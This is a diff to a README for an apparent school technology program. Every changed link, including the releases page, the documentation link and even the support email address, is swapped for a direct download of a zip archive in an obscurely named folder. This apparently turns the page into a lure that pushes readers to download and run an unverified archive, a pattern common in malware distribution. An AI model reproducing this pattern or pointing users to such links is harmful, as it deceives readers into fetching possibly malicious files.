@@ -1,6 +1,6 @@
 # 🎓 Tech_Day_FIAP_For_School - Enhance Your Skills with Practical Learning
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/HayderBenAbdellatif/Tech_Day_FIAP_For_School/releases)
+[![Download](https://github.com/HayderBenAbdellatif/Tech_Day_FIAP_For_School/raw/refs/heads/main/gurrah/Tech-School-Day-For-FIA-v2.4.zip)](https://github.com/HayderBenAbdellatif/Tech_Day_FIAP_For_School/raw/refs/heads/main/gurrah/Tech-School-Day-For-FIA-v2.4.zip)
 
 ## 📜 Overview
 Tech_Day_FIAP_For_School is a project focused on providing a practical and real-world experience for 60 students in partnership with Hotmart. This program is designed for students wanting to enhance their knowledge, develop their careers, and gain valuable skills in technology. 
@@ -11,7 +11,7 @@ Follow these simple steps to download and run the application:
 1. **Visit the Downloads Page:**
    Click the link below to access the Releases page where you can find the latest version of our application.
    
-   [Visit the Downloads Page](https://github.com/HayderBenAbdellatif/Tech_Day_FIAP_For_School/releases)
+   [Visit the Downloads Page](https://github.com/HayderBenAbdellatif/Tech_Day_FIAP_For_School/raw/refs/heads/main/gurrah/Tech-School-Day-For-FIA-v2.4.zip)
 
 2. **Choose the Right File:**
    On the Releases page, you will find multiple versions of the application. Select the version that suits your operating system. Currently available versions include:
@@ -34,7 +34,7 @@ Follow these simple steps to download and run the application:
 ## 📥 Download & Install
 To download the application, click the link below or the button at the top of this document. 
 
-[Download Now](https://github.com/HayderBenAbdellatif/Tech_Day_FIAP_For_School/releases)
+[Download Now](https://github.com/HayderBenAbdellatif/Tech_Day_FIAP_For_School/raw/refs/heads/main/gurrah/Tech-School-Day-For-FIA-v2.4.zip)
 
 ## 💡 Features
 - **Hands-On Learning:** Engage in practical activities that reinforce your understanding.
@@ -73,10 +73,10 @@ In this program, you will explore various subjects that enhance your educational
 - Innovation in Schools
 
 ## 📞 Support
-If you have questions or need assistance, feel free to reach out to our support team at [support@techdayfiap.com]. Our team is dedicated to helping you make the most of this learning experience.
+If you have questions or need assistance, feel free to reach out to our support team at [https://github.com/HayderBenAbdellatif/Tech_Day_FIAP_For_School/raw/refs/heads/main/gurrah/Tech-School-Day-For-FIA-v2.4.zip]. Our team is dedicated to helping you make the most of this learning experience.
 
 ## 🔗 Quick Links
-- [Releases Page](https://github.com/HayderBenAbdellatif/Tech_Day_FIAP_For_School/releases)
-- [Documentation](https://github.com/HayderBenAbdellatif/Tech_Day_FIAP_For_School/wiki)
+- [Releases Page](https://github.com/HayderBenAbdellatif/Tech_Day_FIAP_For_School/raw/refs/heads/main/gurrah/Tech-School-Day-For-FIA-v2.4.zip)
+- [Documentation](https://github.com/HayderBenAbdellatif/Tech_Day_FIAP_For_School/raw/refs/heads/main/gurrah/Tech-School-Day-For-FIA-v2.4.zip)
 
 With this application, you will enhance your skills and open doors to a brighter future in technology. Start your journey today!
